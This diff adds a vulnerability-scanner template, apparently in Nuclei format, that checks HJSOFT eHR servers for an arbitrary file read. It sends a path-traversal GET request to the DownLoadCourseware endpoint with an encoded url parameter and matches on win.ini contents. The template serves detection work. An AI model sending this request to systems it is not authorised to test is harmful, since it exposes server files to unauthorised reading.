@@ -1,0 +1,29 @@
+id: hjsoft-ehr-downloadcourseware-anyfile-read
+info:
+  name: HJSOFT eHR DownLoadCourseware Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+      - type: regex
+        part: header
+        regex:
+          - "filename="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: status
+        status:
+          - 200
